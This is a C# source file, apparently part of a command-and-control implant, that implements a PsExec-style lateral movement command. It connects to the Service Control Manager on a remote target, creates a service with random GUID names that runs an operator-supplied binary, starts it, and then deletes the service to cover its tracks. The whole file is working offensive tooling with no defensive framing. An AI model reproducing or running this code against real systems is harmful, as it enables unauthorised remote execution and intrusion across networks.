using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Models;
using WinAPI.DInvoke;
using WinAPI.Data.AdvApi;
using Shared;

namespace Agent.Commands.Execution
{
    internal class PsExecCommand : AgentCommand
    {
        public override CommandId Command => CommandId.PsExec;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {

            task.ThrowIfParameterMissing(ParameterId.Path);
            task.ThrowIfParameterMissing(ParameterId.Target);

            string binpath = task.GetParameter<string>(ParameterId.Path);
            string target = task.GetParameter<string>(ParameterId.Target);

            context.AppendResult($"target : {target}");
            context.AppendResult($"binpath : {binpath}");


            var serviceName = ShortGuid.NewGuid();
            var displayName = ShortGuid.NewGuid();
            if (task.HasParameter(ParameterId.Service))
                serviceName = task.GetParameter<string>(ParameterId.Service);

            if (task.HasParameter(ParameterId.Name))
                displayName = task.GetParameter<string>(ParameterId.Name);

            // open handle to scm
            var scmHandle = Advapi.OpenSCManager(
                target,
                SCM_ACCESS_RIGHTS.SC_MANAGER_CREATE_SERVICE);

            if (scmHandle == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());

           

            // create service
            var svcHandle = Advapi.CreateService(
                scmHandle,
                serviceName,
                displayName,
                SERVICE_ACCESS_RIGHTS.SERVICE_ALL_ACCESS,
                SERVICE_TYPE.SERVICE_WIN32_OWN_PROCESS,
                START_TYPE.SERVICE_DEMAND_START,
                binpath);

            if (svcHandle == IntPtr.Zero)
            {
                Advapi.CloseServiceHandle(scmHandle);
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }

            // start service
            // this will fail on generic commands, so don't expect a true result
            Advapi.StartService(svcHandle);

            // little sleep
            Thread.Sleep(3000);

            // delete service
            Advapi.DeleteService(svcHandle);

            // close handles
            Advapi.CloseServiceHandle(svcHandle);
            Advapi.CloseServiceHandle(scmHandle);
        }
    }
}
